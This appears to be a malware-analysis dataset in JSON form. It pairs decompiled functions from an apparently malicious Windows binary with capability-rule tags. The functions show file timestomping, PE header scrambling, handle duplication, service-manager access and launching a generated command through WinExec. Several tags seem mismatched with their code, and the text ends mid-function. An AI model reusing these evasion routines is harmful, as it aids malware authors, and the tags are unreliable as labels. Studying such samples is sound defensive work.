{
    "00401000": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004010eb)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401000(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    char *pcVar7;\n    char *pcVar8;\n    char *pcVar9;\n    uint *puVar10;\n    bool bVar11;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint var_14h;\n    int32_t var_4h;\n    \n    // [00] -r-x section size 16384 named .text\n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar6 = &var_22fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    bVar11 = false;\n    var_12ch = '\\0';\n    puVar6 = &var_12bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    if ((!bVar11) && (bVar11)) {\n        out(0xbd, uVar2);\n        return uVar2;\n    }\n    uVar4 = 0xffffffff;\n    pcVar8 = &lpBuffer;\n    do {\n        pcVar7 = pcVar8;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar7 = pcVar8 + 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar4 = ~uVar4;\n    puVar6 = pcVar7 + -uVar4;\n    puVar10 = &var_12ch;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    uVar4 = 0xffffffff;\n    pcVar8 = 0x41f47c;\n    do {\n        pcVar7 = pcVar8;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar7 = pcVar8 + 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar4 = ~uVar4;\n    iVar3 = -1;\n    pcVar8 = &var_12ch;\n    do {\n        pcVar9 = pcVar8;\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        pcVar9 = pcVar8 + 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar9;\n    } while (cVar1 != '\\0');\n    puVar6 = pcVar7 + -uVar4;\n    puVar10 = pcVar9 + -1;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    iVar3 = var_4h;\n    if ((arg_ch == -1) && (iVar3 = fcn.00403ba0(arg_8h),  iVar3 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar3, &lpCreationTime, *0x10 + -0x20, 0xe8);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    return 1;\n}\n",
        "token_count": 1246
    },
    "00401300": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004013f8) overlaps instruction at (ram,0x004013f7)\n// \n// WARNING: Removing unreachable block (ram,0x004013f8)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00401300(int16_t *arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    int16_t **unaff_EDI;\n    uint32_t *puVar6;\n    bool bVar7;\n    uint32_t var_4h;\n    \n    if (*arg_8h != 0x5a4d) {\n        return 0;\n    }\n    if (*(*(arg_8h + 0x1e) + arg_8h) != 0x4550) {\n        return 0;\n    }\n    if ((*(arg_8h + 0x1e) + arg_8h)[0x16] != 0) {\n        return 0;\n    }\n    var_4h = 0x40;\n    uVar4 = *(arg_8h + 0x1e);\n    if (0x80 < *(arg_8h + 0x1e)) {\n        if ((0x7f < uVar4) && (uVar4 < 0x80)) {\n            out(0xc4, arg_8h);\n            *unaff_EDI = arg_8h;\n        }\n        if (*(arg_8h + 0x1e) < 0xc0) {\n            var_4h = *(arg_8h + 0x1e) - 0x80;\n        }\n        puVar2 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(var_4h);\n        pcVar1 = _sym.imp.MSVCRT.dll_rand;\n        if (puVar2 != NULL) {\n            uVar4 = 0;\n            bVar7 = false;\n            if (var_4h != 0) {\n                do {\n                    if ((!bVar7) && (bVar7)) {\n                        if (*puVar2 <= &stack0xffffffe0 && puVar2 + 1 != 0) {\n                            return puVar2 + 1;\n                        }\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n                    iVar3 = (*pcVar1)();\n                    bVar7 = uVar4 + 1 < var_4h;\n                    *(uVar4 + puVar2) = iVar3 % 0xff;\n                    uVar4 = uVar4 + 1;\n                } while (bVar7);\n            }\n            puVar5 = puVar2;\n            puVar6 = arg_8h + 0x40;\n            for (uVar4 = var_4h >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n                *puVar6 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            for (var_4h = var_4h & 3; var_4h != 0; var_4h = var_4h - 1) {\n                *puVar6 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            sub.MSVCRT.dll_void___cdecl_operator_delete_void__(puVar2);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 834
    },
    "00403df0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00403df0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00402d90(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x41f878, acStack1304, &uStack2112);\n    uStack2088 = 0x41f930;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x41f948;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00403d20(auStack1564, 0x41f874, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1849
    },
    "00401180": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00401180(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00403ba0(0x41f444);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "004027e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004027e0(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00403ab0(0x41f4b0);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(param_1, iVar1, 0, 0, 0, 2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 209
    },
    "004028b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402993) overlaps instruction at (ram,0x00402990)\n// \n\nuint32_t __cdecl fcn.004028b0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t arg_ch_00;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uint *unaff_EDI;\n    bool bVar4;\n    unkbyte6 Var5;\n    int32_t iStack60;\n    uint uStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    uStack16 = 0;\n    uStack20 = 0x80;\n    uStack24 = 2;\n    uStack28 = 0;\n    uStack32 = 1;\n    uStack36 = 0x40000000;\n    uStack40 = arg_8h;\n    uStack44 = 0x4028d1;\n    arg_ch_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (arg_ch_00 == -1) {\n        return 0;\n    }\n    puStack48 = &fcn.004028b0::arg_8h;\n    uStack44 = 0;\n    uStack52 = arg_10h;\n    uStack56 = arg_ch;\n    iStack60 = arg_ch_00;\n    Var5 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n    bVar4 = Var5 == 0;\n    if (bVar4) {\n        return 0;\n    }\n    uVar2 = *0x41f994;\n    if ((!bVar4) && (bVar4)) {\n        uVar1 = in(Var5 >> 0x20);\n        *unaff_EDI = uVar1;\n        uVar2 = Var5;\n        if (&stack0xffffffc4 < 1) {\n            return 1;\n        }\n    }\n    uVar2 = uVar2 ^ 0xdee0ed6d;\n    uVar2 = uVar2 & 0xffff0000 | uVar2 + (uVar2 >> 8) * -0x31;\n    *(extraout_ECX + 0x41f994) = *(extraout_ECX + 0x41f994);\n    bVar4 = false;\n    if (uVar2 != 0) {\n        iVar3 = fcn.004027e0(arg_ch_00);\n        bVar4 = (iVar3 != 0) != 0;\n        uVar2 = 1 - (iVar3 != 0);\n        *0x41f994 = uVar2;\n    }\n    if ((!bVar4) && (bVar4)) {\n        out(0xbd, uVar2);\n        return uVar2;\n    }\n    fcn.00401000(0, arg_ch_00);\n    if (*0x41f994 == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_ch_00);\n    }\n    return 1;\n}\n",
        "token_count": 728
    },
    "004029a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004029a0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *unaff_EDI;\n    bool in_OF;\n    uint in_stack_00000014;\n    \n    if ((!in_OF) && (in_OF)) {\n        *unaff_EDI = in_stack_00000014;\n        return in_stack_00000014;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 132
    },
    "00403850": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403912) overlaps instruction at (ram,0x00403911)\n// \n// WARNING: Removing unreachable block (ram,0x00403912)\n// WARNING: Removing unreachable block (ram,0x00403975)\n// WARNING: Removing unreachable block (ram,0x00403979)\n// WARNING: Removing unreachable block (ram,0x0040397a)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00403850(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    char cVar4;\n    char cVar5;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint *in_stack_00000018;\n    int32_t in_stack_0000001c;\n    uchar uStack272;\n    uint uStack271;\n    uchar auStack12 [4];\n    uint uStack8;\n    \n    fcn.00402fa0(in_stack_00000014, in_stack_00000018);\n    fcn.00402fa0(in_stack_00000014, in_stack_00000018);\n    cVar5 = '\\0';\n    cVar4 = '\\0';\n    uVar1 = fcn.00402fa0(in_stack_00000014, in_stack_00000018);\n    puVar3 = in_stack_00000018;\n    if (cVar5 == cVar4) {\n        if (cVar5 != cVar4) {\n            out(0xc4, uVar1);\n            puVar3 = in_stack_00000018 + 1;\n            *in_stack_00000018 = uVar1;\n        }\n    }\n    fcn.00402fa0(in_stack_00000014, puVar3, in_stack_00000010, 0x20, in_stack_0000001c + 0xe0);\n    iVar2 = fcn.00403800();\n    if (iVar2 == -1) {\n        iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(in_stack_0000001c + 0x120) = iVar2 % 5;\n    }\n    else {\n        *(in_stack_0000001c + 0x120) = iVar2;\n    }\n    uStack272 = 0;\n    puVar3 = &uStack271;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    uStack8 = 0x104;\n    *(puVar3 + 2) = 0;\n    iVar2 = fcn.004036a0(0x80000001, 0x41f6d0, 0x41f6fc, auStack12, &uStack272, &uStack8);\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&uStack272, 0x41f74c);\n        if (iVar2 == 0) {\n            *(in_stack_0000001c + 0x120) = *(in_stack_0000001c + 0x120) | 0x80;\n        }\n    }\n    return;\n}\n",
        "token_count": 750
    },
    "00403ab0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403aef) overlaps instruction at (ram,0x00403aea)\n// \n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00403aef)\n\nint32_t __cdecl fcn.00403ab0(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    bool bVar6;\n    int32_t iStack332;\n    uint var_12ch;\n    uint var_128h;\n    int32_t var_124h;\n    uint var_108h;\n    int32_t var_4h;\n    \n    var_4h = -1;\n    iVar2 = (**0x41f968)();\n    if (iVar2 == -1) {\n        return -1;\n    }\n    puVar5 = &var_128h;\n    for (iVar4 = 0x49; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iStack332 = iVar2;\n    iVar3 = (**0x41f96c)();\n    pcVar1 = _sym.imp.MSVCRT.dll__stricmp;\n    iVar4 = var_4h;\n    while( true ) {\n        bVar6 = iVar3 == 0;\n        var_4h = iVar4;\n        if (bVar6) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            return iVar4;\n        }\n        if ((!bVar6) && (bVar6)) break;\n        iVar4 = (*pcVar1)(&var_108h, arg_8h);\n        bVar6 = iVar4 == 0;\n        if (bVar6) {\n            if ((!bVar6) && (bVar6)) {\n                *(arg_8h + -0x75) = *(arg_8h + -0x75) - &iStack332;\n                var_124h = arg_8h;\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            return var_124h;\n        }\n        iVar3 = (**0x41f970)(iVar2);\n        iVar4 = var_4h;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 562
    },
    "00403ff0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00403ff0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar1 = fcn.00401510();\n    if (iVar1 == 0) {\n        fcn.004041a0();\n        return false;\n    }\n    fcn.00402be0();\n    iVar1 = fcn.00403ab0(0x41f4a8);\n    if (iVar1 != -1) {\n        iVar1 = fcn.00403ab0(0x41f49c);\n        if (iVar1 == -1) {\n            fcn.004041a0();\n        }\n        return false;\n    }\n    fcn.00402310();\n    iVar1 = fcn.00401180();\n    if (iVar1 != 0) {\n        return false;\n    }\n    var_20h = 0;\n    var_80h._0_1_ = 0;\n    puVar2 = &var_1fh;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_60h._0_1_ = 0;\n    puVar2 = &var_80h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_40h._0_1_ = 0;\n    puVar2 = &var_60h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &var_40h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00401650(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = fcn.004011c0(&var_20h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = fcn.004018c0(&var_80h, &var_60h, &var_20h, &var_40h);\n    return iVar1 != 0;\n}\n",
        "token_count": 739
    },
    "00404770": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004048aa) overlaps instruction at (ram,0x004048a5)\n// \n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0x00000000 : 0x0040484d\n// WARNING: Removing unreachable block (ram,0x004048aa)\n\nbool fcn.00404770(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint *puVar3;\n    uint var_210h;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10ch = 0;\n    var_4h = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar1 = fcn.004036a0(0x80000002, 0x41f8b4, 0x41f8f4, &var_8h, &var_210h, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_210h, 0);\n    if (iVar1 == -1) {\n        return false;\n    }\n    iVar1 = fcn.00404640(&var_210h, &var_10ch);\n    pcVar2 = _sym.imp.MSVCRT.dll_strstr;\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(&var_10ch, 0x41f90c);\n        if (iVar1 == 0) {\n            if ((-1 < iVar1) && (-1 >= iVar1)) {\n                pcVar2 = pcVar2 + -1;\n                *(puVar3 + 3U | &stack0xfffffffc) = 0;\n            }\n    // WARNING: Could not recover jumptable at 0x004048aa. Too many branches\n    // WARNING: Treating indirect jump as call\n            iVar1 = (*pcVar2)(&var_10ch, 0x41f910);\n            return iVar1 != 0;\n        }\n        return true;\n    }\n    return false;\n}\n",
        "token_count": 587
    },
    "00402de0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402de0(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.00401580(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 121
    },
    "00404290": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040438e) overlaps instruction at (ram,0x0040438c)\n// \n// WARNING: Removing unreachable block (ram,0x0040438e)\n// WARNING: Removing unreachable block (ram,0x00404398)\n// WARNING: Removing unreachable block (ram,0x0040439c)\n// WARNING: Removing unreachable block (ram,0x004043d9)\n// WARNING: Removing unreachable block (ram,0x004043e4)\n// WARNING: Removing unreachable block (ram,0x004043e8)\n// WARNING: Removing unreachable block (ram,0x004043ea)\n// WARNING: Removing unreachable block (ram,0x004043f2)\n// WARNING: Removing unreachable block (ram,0x004043ef)\n// WARNING: Removing unreachable block (ram,0x00404404)\n// WARNING: Removing unreachable block (ram,0x004043f7)\n// WARNING: Removing unreachable block (ram,0x00404408)\n// WARNING: Removing unreachable block (ram,0x0040440a)\n// WARNING: Removing unreachable block (ram,0x0040440e)\n// WARNING: Removing unreachable block (ram,0x0040440f)\n// WARNING: Removing unreachable block (ram,0x00404412)\n// WARNING: Removing unreachable block (ram,0x00404445)\n// WARNING: Removing unreachable block (ram,0x00404454)\n// WARNING: Removing unreachable block (ram,0x0040444d)\n// WARNING: Removing unreachable block (ram,0x00404458)\n// WARNING: Removing unreachable block (ram,0x00404463)\n// WARNING: Removing unreachable block (ram,0x0040446c)\n// WARNING: Removing unreachable block (ram,0x00404470)\n// WARNING: Removing unreachable block (ram,0x0040447c)\n// WARNING: Removing unreachable block (ram,0x00404481)\n// WARNING: Removing unreachable block (ram,0x004044e4)\n// WARNING: Removing unreachable block (ram,0x004044f4)\n// WARNING: Removing unreachable block (ram,0x004044fe)\n// WARNING: Removing unreachable block (ram,0x0040450a)\n// WARNING: Removing unreachable block (ram,0x0040450d)\n// WARNING: Removing unreachable block (ram,0x00404511)\n// WARNING: Removing unreachable block (ram,0x0040456f)\n// WARNING: Removing unreachable block (ram,0x00404584)\n// WARNING: Removing unreachable block (ram,0x00404577)\n// WARNING: Removing unreachable block (ram,0x004044ec)\n// WARNING: Removing unreachable block (ram,0x004044ef)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.00404290(uint arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    bool in_ZF;\n    uint8_t in_IF;\n    bool bVar6;\n    bool bVar7;\n    uint var_4h;\n    \n    bVar6 = false;\n    if ((!in_ZF) && (in_ZF)) {\n        bVar6 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n    }\n    uVar2 = fcn.004035f0(0, arg_8h, arg_ch + 1U >> 1);\n    uVar2 = uVar2 & 0xffff;\n    puVar3 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(arg_8h);\n    uVar1 = *(puVar3 + 0x58);\n    if (uVar2 < uVar1) {\n        iVar4 = (uVar2 - uVar1 & 0xffff) - 1;\n    }\n    else {\n        iVar4 = uVar2 - (uVar1 & 